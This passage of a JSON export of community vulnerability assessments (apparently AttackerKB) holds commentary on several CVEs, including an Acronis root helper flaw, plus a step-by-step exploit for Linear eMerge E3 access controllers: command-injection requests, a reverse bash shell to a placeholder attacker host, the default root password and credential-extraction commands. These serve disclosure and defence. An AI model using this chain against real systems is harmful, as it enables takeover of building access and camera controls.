      "document": "Because this is CSRF, it's very difficult to exploit - it requires an attacker to know the network layout, then either get super lucky or socially engineer an administrator. Although it's an interesting vulnerability with a great payoff, I'll be surprised if this gets exploited.\r\n\r\nOn the flip side, the PoCs I wrote create a persistent backdoor, and don't require the attacker to have direct network access to the management interface - it can all be done through the administrator's browser.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "69f5c2ab-76aa-4ad6-b142-c6ac0d84589d",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "8a415e70-0434-40ee-8f25-e3f24cc31ec0",
      "created": "2022-11-16T23:29:55.69213Z",
      "revisionDate": "2022-11-16T23:29:55.69106Z",
      "document": "Acronis TrueImage comes installed with an XPC service by default:\r\n\r\n```\r\n$ ls -al /Library/PrivilegedHelperTools\r\ntotal 96\r\ndrwxr-xr-t   3 root  wheel     96 Nov  9 15:19 .\r\ndrwxr-xr-x  66 root  wheel   2112 Nov  9 15:41 ..\r\n-rwxr-xr-x   1 root  wheel  47216 Nov  9 15:19 com.acronis.trueimagehelper\r\n```\r\n\r\nInside its `shouldAcceptNewConnection` method, it accepts a connection from the connecting client without any validation:\r\n\r\n```objective-c\r\n/* @class HelperTool */\r\n-(char)listener:(void *)arg2 shouldAcceptNewConnection:(void *)arg3 {\r\n    var_30 = [arg3 retain];\r\n    rbx = [[NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)] retain];\r\n    [arg3 setExportedInterface:rbx];\r\n    [rbx release];\r\n    [arg3 setExportedObject:self];\r\n    [arg3 resume];\r\n    [var_30 release];\r\n    return 0x1;\r\n}\r\n```\r\n\r\nThe service uses the `HelperToolProtocol` to set up an interface for the connection. `class-dump` shows that there are three methods implemented by the `HelperToolProtocol`, with one being `executeProcess:arguments:caller:withReply:`:\r\n\r\n```\r\n$ ./class-dump /Library/PrivilegedHelperTools/com.acronis.trueimagehelper \r\n...\r\n@protocol HelperToolProtocol\r\n- (void)checkFullDiskAccessWithReply:(void (^)(BOOL))arg1;\r\n- (void)executeProcess:(NSString *)arg1 arguments:(NSArray *)arg2 caller:(int)arg3 withReply:(void (^)(int))arg4;\r\n- (void)getProcessIdentifierWithReply:(void (^)(int))arg1;\r\n@end\r\n```\r\n\r\nExecuting the `executeProcess:arguments:caller:withReply:` method allows for executing arbitrary processes via the following block:\r\n\r\n```objective-c\r\nint ___56-[HelperTool executeProcess:arguments:caller:withReply:]_block_invoke(int arg0) {\r\n    r14 = [[NSTask launchedTaskWithLaunchPath:*(arg0 + 0x20) arguments:*(arg0 + 0x28)] retain];\r\n    objc_sync_enter([[*(arg0 + 0x30) pids] retain]);\r\n    var_30 = [[*(arg0 + 0x30) pids] retain];\r\n    r12 = [[NSNumber numberWithInt:[r14 processIdentifier]] retain];\r\n    rbx = [[NSNumber numberWithInt:*(int32_t *)(arg0 + 0x40)] retain];\r\n    [var_30 setObject:rbx forKeyedSubscript:r12];\r\n    [rbx release];\r\n    [r12 release];\r\n    [var_30 release];\r\n    [*(arg0 + 0x30) startTimer];\r\n    objc_sync_exit(rax);\r\n    [rax release];\r\n    [r14 waitUntilExit];\r\n    r15 = [r14 terminationReason];\r\n    rbx = *(arg0 + 0x38);\r\n    rax = [r14 terminationStatus];\r\n    if (r15 == 0x2) {\r\n            rax = rax + 0x3e8;\r\n    }\r\n    (*(rbx + 0x10))(rbx, rax);\r\n    rax = [r14 release];\r\n    return rax;\r\n}\r\n```\r\n\r\nExploiting this vulnerability is fairly trivial and will give an attacker `root` privileges. Granted, this is now a two year old vulnerability, but it spans a large range of versions and uninstalling the main application will not remove the helper tool. Definitely check `/Library/PrivilegedHelperTools` if a vulnerable version was installed and was removed without updating.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "587c4617-456d-4597-933a-4135d58002a2",
      "editorId": "e596034d-6ecd-45e2-8253-596febcd5c67",
      "topicId": "9d93846f-4cab-45ff-ad2d-f2e568742ea9",
      "created": "2022-11-18T10:22:48.635764Z",
      "revisionDate": "2022-11-20T15:15:35.409879Z",
      "document": "",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": []
    },
    {
      "id": "aec80822-1405-491e-94e4-2d06e7822f9e",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "0ee9e53a-fb5d-4df2-9d3e-c36b52da0d76",
      "created": "2022-12-03T12:46:57.991412Z",
      "revisionDate": "2022-12-11T23:03:48.997962Z",
      "document": "Building Automation and Access Control systems are at the heart of many critical infrastructures, and their security is vital. Executing attacks on these systems may enable unauthenticated attackers to access and manipulate doors, elevators, air-conditioning systems, cameras, boilers, lights, safety alarm systems in an entire building - potentially causing physical damage, introducing safety risks or financial repercussions. \r\n\r\nIn one of the recent security engagements,  we stumbled across a Nortek Linear eMerge E3 Access Controller managing all the building and camera access. It was exposed to the Internet for remote management on port 80 and we soon figured out that it was vulnerable.\r\n\r\nAnd guess what, these vulnerabilities were already discovered in 2019 by `Gjoko Krstic` a.k.a `LiquidWorm` from Applied Risk. He published a paper [AR2019005] (https://applied-risk.com/resources/ar-2019-005) that demonstrated a raft of critical vulnerabilities that exists on these Building Access Control Systems. \r\n`Nortek Security & Control, LLC (NSC)` , the manufacturer of these Access Controls Systems is a leader in wireless security, home automation and personal safety systems and devices.\r\nThey claim that the eMerge E3-Series embedded browser-based network appliance platform makes `advanced security` technology `reliable` and affordable for any entry-level access control application.\r\n\r\nWell, forget the words `advanced security` and `reliable` because it is pretty tragic to see that the majority of these Linear eMerge E3 access controllers (around **3500** listed in `Shodan`) are still vulnerable in 2022 and impose a huge security risk on the organizations using these devices for their physical and logical security.\r\n\r\nRecently  `Nice`, a global manufacturer of smart home, security and building automation solutions, announced the acquisition of Nortek and let's hope that this will improve the quality of their security products.\r\n\r\nNow let's demonstrate on how vulnerable this platform is and bare in mind that this platform is responsible for building and camera access and therefore a prime target for malicious actors.\r\n\r\nWithin the Linear eMerge E3 access controller, several endpoints are vulnerable to a remote command injection (RCE).\r\n* http://<HOST:PORT>/card_scan_decoder.php?No=30&door=%60<CMD>%60\r\n* http://<HOST:PORT>/card_scan.php?No=30&ReaderNo=%60<CMD>%60\r\n* http://<HOST:PORT>/card_scan.php?No=1337&ReaderNo=%60<CMD>%60&CardFormatNo=1337\r\n\r\nYou can easily demonstrate this with `burpsuite` crafting a request, using the `sleep` command or create a test file with the command `whoami > cuckoo.txt` which then can be access through the web interface.\r\n\r\n**Burp request**\r\n```\r\nGET /card_scan_decoder.php?No=30&door=%60sleep+10%60 HTTP/1.1\r\nHost: <IP HOST>\r\nUser-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\n```\r\n**Response** which will take around 10 seconds...\r\n```\r\nHTTP/1.1 200 OK\r\nX-Powered-By: PHP/5.5.23\r\nExpires: Mon, 26 Jul 1997 05:00:00 GMT\r\nLast-Modified: Sat, 03 Dec 2022 04:53:22 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nCache-Control: post-check=0, pre-check=0\r\nPragma: no-cache\r\nContent-type: text/html; charset=utf-8\r\nConnection: close\r\nDate: Sat, 03 Dec 2022 04:53:32 GMT\r\nServer: lighttpd/1.4.22\r\nContent-Length: 67\r\n\r\n{\"raw\":false,\"card_format_default\":\"\",\"total_bit\":null,\"data\":null}\r\n```\r\nExample with `whoami` command\r\n\r\n**Burp request**\r\n```\r\nGET /card_scan_decoder.php?No=30&door=%60whoami+>cuckoo.txt%60 HTTP/1.1\r\nHost: <IP HOST>\r\nUser-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\n```\r\n**Get cuckoo.txt**\r\n```\r\nGET /cuckoo.txt HTTP/1.1\r\nHost: <IP HOST>\r\nUser-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\n```\r\n**Response**\r\n```\r\nHTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nAccept-Ranges: bytes\r\nETag: \"2943015055\"\r\nLast-Modified: Sat, 03 Dec 2022 05:02:15 GMT\r\nContent-Length: 9\r\nConnection: close\r\nDate: Sat, 03 Dec 2022 05:07:06 GMT\r\nServer: lighttpd/1.4.22\r\n\r\nlighttpd\r\n```\r\nThis is already pretty interesting for malicious actors to pursue, but there is more to it.\r\nThe `lighttpd` user is restricted to execute certain commands due a restricted `busybox` implementation, so it is difficult to get a real reverse shell or meterpreter session established which gives full control on the server.\r\n\r\nWell, do not worry, our Nortek friends also decided to implement a default root password on the access controller which easily can be picked from `etc/password`. \r\nYes,  you red  it right, `/etc/password` with read rights for the world instead of using `/etc/shadow` (see my analysis on [CVE-2019-7252](https://attackerkb.com/topics/v1NMUqh8F2/cve-2019-7252) for more info).\r\nThis password has already been hacked in 2019 and can be used to escalate privileges and get a root shell or meterpreter session.\r\n\r\nLet's show a quick example how we spawn a root shell...\r\n\r\nFirst generate a payload with `msfvenom`\r\n```\r\n# msfvenom -p cmd/unix/reverse_bash LHOST=<ATTACKER> LPORT=<PORT> -f raw\r\n[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload\r\n[-] No arch selected, selecting arch: cmd from the payload\r\nNo encoder specified, outputting raw payload\r\nPayload size: 77 bytes\r\nbash -c '0<&74-;exec 74<>/dev/tcp/<ATTACKER>/<PORT>;sh <&74 >&74 2>&74'\r\n```\r\nNext step is to create the payload using the default root password `davestyle`\r\n**payload:** `echo davestyle | su -c \"bash -c '0<&74-;exec 74<>/dev/tcp/<ATTACKER>/<PORT>;sh <&74 >&74 2>&74'\"`\r\n\r\nApply URL encoding to make it work in your burp request and start a `multi/handler` with the reverse_bash payload , <ATTACKER> and <PORT> settings in `msf`.\r\n**URL encode payload:** `%60echo+davestyle+%7C+su+-c+%22bash+-c+%270%3C%2674-%3Bexec+74%3C%3E%2Fdev%2Ftcp%2F<ATTACKER>%2F<PORT>%3Bsh+%3C%2674+%3E%2674+2%3E%2674%27%22%60`\r\n\r\n**Burp request**\r\n```\r\nGET /card_scan_decoder.php?No=30&door=%60echo+davestyle+%7C+su+-c+%22bash+-c+%270%3C%2674-%3Bexec+74%3C%3E%2Fdev%2Ftcp%2F<ATTACKER>%2F<PORT>%3Bsh+%3C%2674+%3E%2674+2%3E%2674%27%22%60 HTTP/1.1\r\nHost: <IP HOST>\r\nUser-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\n```\r\n**Metasploit handler**\r\n```\r\nmsf6 exploit(multi/handler) > exploit -j -z\r\n[*] Exploit running as background job 0.\r\n[*] Exploit completed, but no session was created.\r\n\r\n[*] Started reverse TCP handler on <ATTACKER>:<PORT>\r\nmsf6 exploit(multi/handler) > [*] Command shell session 1 opened (127.0.0.1:<PORT> -> 127.0.0.1:48944) at 2022-12-03 11:42:27 +0000\r\n\r\nmsf6 exploit(multi/handler) > sessions -i 1\r\n[*] Starting interaction with 1...\r\n\r\nwhoami\r\nroot\r\nls -l /etc/passwd\r\n-rwxr--r--    1 e3user   linear         733 Nov 13  2012 /etc/passwd\r\ncat /etc/passwd\r\nroot:$1$VVtYRWvv$gyIQsOnvSv53KQwzEfZpJ0:0:100:root:/root:/bin/sh\r\nbin:x:1:1:bin:/bin:\r\ndaemon:x:2:2:daemon:/sbin:\r\nadm:x:3:4:adm:/var/adm:\r\nlp:x:4:7:lp:/var/spool/lpd:\r\nsync:x:5:0:sync:/sbin:/bin/sync\r\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\r\nhalt:x:7:0:halt:/sbin:/sbin/halt\r\nmail:x:8:12:mail:/var/spool/mail:\r\nnews:x:9:13:news:/var/spool/news:\r\nuucp:x:10:14:uucp:/var/spool/uucp:\r\noperator:x:11:0:operator:/root:\r\ngames:x:12:100:games:/usr/games:\r\ngopher:x:13:30:gopher:/usr/lib/gopher-data:\r\nftp:x:14:50:FTP User:/home/ftp:\r\nnobody:x:99:99:Nobody:/home/default:\r\ne3user:$1$vR6H2PUd$52r03jiYrM6m5Bff03yT0/:1000:1000:Linux User,,,:/home/e3user:/bin/sh\r\nlighttpd:$1$vqbixaUx$id5O6Pnoi5/fXQzE484CP1:1001:1000:Linux User,,,:/home/lighttpd:/bin/sh\r\n```\r\n\r\nThe example above show that it is pretty simple to weaponize and therefore there is a high probability of exploitation in the wild.\r\nI have created a Metasploit module that has been submitted to the Metasploit mainstream.\r\n\r\n## Mitigation\r\nPlease update your Linear eMerge E3 access controller to a higher version then  `1.00-06`.\r\n\r\n## References\r\n[Nortek Linear eMerge E3-Series 1.00-06 Multiple Vulnerabilities](https://applied-risk.com/resources/ar-2019-005)\r\n[Packet storm](https://packetstormsecurity.com/files/155256/Linear-eMerge-E3-1.00-06-card_scan_decoder.php-Command-Injection.html)\r\n[Metasploit module](https://github.com/rapid7/metasploit-framework/pull/17312)\r\n\r\n## Credits\r\nCredits goes to the security researcher below who discovered these vulnerabilities.\r\n[Gjoko 'LiquidWorm' Krstic](gjoko@applied-risk.com)\r\n\r\n ",
      "score": 4,
      "metadata": {
        "mitre-tactics": "Credential Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "06eff03d-ef34-4318-b4a8-e2e2ee3ec43e",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "cc2c52ce-f3bf-46ab-a4f9-f67f6596ab52",
      "created": "2022-12-03T15:58:53.471986Z",
      "revisionDate": "2022-12-11T23:03:01.363157Z",
      "document": "In my article [cve-2019-7256](https://attackerkb.com/topics/8WUJkci8N4/cve-2019-7256) at attackerkb.com, I already elaborated on the security risks and vulnerabilities that still exists on the Linear eMerge E3 access controller. \r\nBeside the RCE vulnerabilities, also default credentials exist within the vulnerable configuration that can be easily leveraged to gain privileged access to the system.\r\n\r\nThere are two significant vulnerabilities:\r\nThe first one is based on a default root password that is a stored in the `/etc/passwd` and is available on the vulnerable configuration. This can be used to escalate to root privileges using the RCE vulnerability [CVE-2019-7256](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7256) or use these credentials in combination with `ssh` (if enabled) to get root access  to the access controller.\r\nThe second credential vulnerability allows an unauthenticated malicious actor to obtain the web credentials for user `admin` from the spider database that is accessible and readable for the world on the access controller. With this access, the malicious actor is able to control the Linear eMerge E3 access platform, the access to building and its cameras and the authority to manage the access rights of users.\r\n\r\nLets quickly demonstrate both vulnerabilities...\r\n\r\nWe assume that we have already gained access to the system using the RCE described in [CVE-2019-7256](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7256)\r\n```\r\nls -l /etc/passwd\r\n-rwxr--r--    1 e3user   linear         733 Nov 13  2012 /etc/passwd\r\ncat /etc/passwd\r\nroot:$1$VVtYRWvv$gyIQsOnvSv53KQwzEfZpJ0:0:100:root:/root:/bin/sh\r\nbin:x:1:1:bin:/bin:\r\ndaemon:x:2:2:daemon:/sbin:\r\nadm:x:3:4:adm:/var/adm:\r\nlp:x:4:7:lp:/var/spool/lpd:\r\nsync:x:5:0:sync:/sbin:/bin/sync\r\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\r\nhalt:x:7:0:halt:/sbin:/sbin/halt\r\nmail:x:8:12:mail:/var/spool/mail:\r\nnews:x:9:13:news:/var/spool/news:\r\nuucp:x:10:14:uucp:/var/spool/uucp:\r\noperator:x:11:0:operator:/root:\r\ngames:x:12:100:games:/usr/games:\r\ngopher:x:13:30:gopher:/usr/lib/gopher-data:\r\nftp:x:14:50:FTP User:/home/ftp:\r\nnobody:x:99:99:Nobody:/home/default:\r\ne3user:$1$vR6H2PUd$52r03jiYrM6m5Bff03yT0/:1000:1000:Linux User,,,:/home/e3user:/bin/sh\r\nlighttpd:$1$vqbixaUx$id5O6Pnoi5/fXQzE484CP1:1001:1000:Linux User,,,:/home/lighttpd:/bin/sh\r\n```\r\nAS you can see is the default root password hash stored directly in `/etc/passwd` and readable for world. Normally, these password hashes are stored in a `/etc/shadow` file that is only readable for root. With this configuration, It is very easy to retrieve the hash and run a password dictionary or brute force attack with for instance `hashcat` to retrieve the password. And do not worry, somebody did this job already in 2019 ;-) -> `davestyle`. \r\n\r\nTo test if the root default password is available...\r\n```\r\necho davestyle | su -c whoami\r\nroot\r\n```\r\nThe second credential vulnerability can be exploited by querying the spider access controller database which has the user and password information stored in clear text.\r\n\r\nThis database resides in `/tmp/SpiderDB/Spider.db` and with the command below you can very easily retrieve the admin web credentials.\r\n```\r\ngrep \"Controller\" /tmp/SpiderDB/Spider.db |cut -f 5,6 -d ',' |grep ID\r\nID='admin',Password='xxxxxxx'\r\n```\r\nAnd if this is not successful, you can always try the default web credential setting `admin:admin`\r\n\r\nAnother Metasploit module to test the availability of the default root password and leak the admin web credentials  has been submitted to the Metasploit mainstream.\r\n\r\n## Mitigation\r\nChange the default root password on your access controller.\r\nUpdate your Linear eMerge E3 access controller to a higher version then  `1.00-06`.\r\n\r\n## References\r\n[Nortek Linear eMerge E3-Series 1.00-06 Multiple Vulnerabilities](https://applied-risk.com/resources/ar-2019-005)\r\n[Packet storm](https://packetstormsecurity.com/files/155256/Linear-eMerge-E3-1.00-06-card_scan_decoder.php-Command-Injection.html)\r\n\r\n## Credits\r\nCredits goes to the security researcher below who discovered these vulnerabilities.\r\n[Gjoko 'LiquidWorm' Krstic](gjoko@applied-risk.com)\r\n\r\n",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Credential Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "dfae995e-8725-4f23-9d97-627664ae0bf7",
      "editorId": "9ad93408-dd2f-476c-8540-b6062ece6db8",
      "topicId": "e87e8bef-4c30-45be-9119-65d9feaa949b",
      "created": "2022-12-09T17:11:14.163849Z",
      "revisionDate": "2022-12-11T23:03:09.366112Z",
      "document": "Here's the [original FreeBSD](https://www.freebsd.org/security/advisories/FreeBSD-SA-22:15.ping.asc) vulnerability notification, and at first glance, it seems like kind of a big deal: stack-based buffer overflow of up to 40 bytes in the standard FreeBSD implementation of `ping`.\r\n\r\nHowever, a little digging shows that actually exploiting this is severely limited by virtue of FreeBSD's [capability management system](https://www.freebsd.org/cgi/man.cgi?cap_enter(2)); indeed, although it's a buffer overflow in a `setuid` binary, that binary doesn't get to do much other than read and write network packets, so it's unclear what an exploit would actually accomplish.\r\n\r\nI ran a [little poll](https://infosec.exchange/@todb/109435611019281236) on the infosec.exchange instance on Mastodon, asking around what people thought of this. I'm not particularly famous on Mastodon, so only 84 respondents, though they're all nominally infosec professionals. A whopping 61% said they didn't know what the impact could be, 33% said it wasn't a big deal (presumably because of this capability sandbox), and only 6% considered it something worrisome/interesting.\r\n\r\nIncidentally, I rated this as \"difficult to patch\" considering that FreeBSD, and `ping` in particular, is likely running on millions of embedded devices. So while a normal old FreeBSD server or workstation is comparatively easy to patch, these IoT doo-dads that are certainly running it, and that sometimes shell out to `ping`, are going to be mysterious. Also, since it's a client-initiated attack, you can't simply scan for it in the usual vuln-management sort of way. ",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 3,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "27d319da-b152-4347-bd58-6b8fae07324c",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "12f253e0-f6f2-4628-a989-57a36e8c7026",
      "created": "2022-12-13T14:02:37.786754Z",
      "revisionDate": "2023-01-09T10:16:14.872665Z",
      "document": "Heap-based buffer overflow in the `sslvpnd` component of Fortinet SSL VPNs. Fortinet disclosed publicly on December 12 with a note that it had been exploited in the wild, evidently after putting out a private warning to customers the week prior. Since then, there's been community discussion about whether this was exploited as 0day or not, as the vendor evidently [silently patched](https://www.bleepingcomputer.com/news/security/fortinet-says-ssl-vpn-pre-auth-rce-bug-is-exploited-in-attacks/) the vuln roughly two weeks before public disclosure (giving attackers plenty of time to reverse the patch before many customers were aware there was a problem). \r\n\r\nHeap-based BOF probably isn't quite as easily exploitable as, say, a stack-based cousin. Even if this wasn't true 0day, my bets are on an advanced and/or state-sponsored threat actor being the culprit for initial exploitation. Not sure we'll see mass exploitation right away, or even at all...unless of course someone figures out where the bug lives and develops a public exploit, in which case, the exploitability rating on this will ratchet up. The attacker value of compromising a Fortinet device is high enough to motivate folks. ",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "9064f532-1986-4e19-a001-e6cff5161bae",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "00dcac7d-72af-4567-be1a-d7dca781ec1d",
      "created": "2022-12-13T16:40:13.009695Z",
      "revisionDate": "2022-12-13T16:40:13.011788Z",
      "document": "Sounds like Cisco [was seeing](https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/) small-ish-scale exploitation of this bug over the summer to gain initial access and deploy TrueBot payloads. I'd never heard of this product before now, but looking at its website, it looks to be security/IT management software with lots of enterprise customers\u2014i.e., one of those things that's probably under-scrutinized by researchers (and thus a nifty fun-time target for attackers). Not a lot of internet-facing attack surface area, which is good, but I have to wonder how many people even know there's a serious vuln in this stuff, let alone how many have actually patched.\r\n\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "39d25e85-c843-4e2b-b6b0-03ed388ac7aa",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "c7e01dff-a28a-4977-992d-5fa54acd051c",
      "created": "2022-12-13T23:06:11.908434Z",
      "revisionDate": "2022-12-13T23:06:39.604301Z",
      "document": "Lots of advanced-ish threat notifications this week...Citrix published a security advisory and a [companion blog](https://www.citrix.com/blogs/2022/12/13/critical-security-update-now-available-for-citrix-adc-citrix-gateway/) on this zero-day bug today, noting that it's been exploited in the wild. The NSA also [released information](https://media.defense.gov/2022/Dec/13/2003131586/-1/-1/0/CSA-APT5-CITRIXADC-V1.PDF) about APT 5 targeting Citrix ADC installations; their bulletin includes threat intel. \r\n\r\nADC is always a nice target, and often hangs out on the internet. Leaving \"Exploitability\" as a medium for now since there's not a ton on the vuln inself, other than that it's SAML-related. I'd expect more vuln details out on this one shortly, and probably a rise in exploitation\u2014just in time for the holidays. ",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
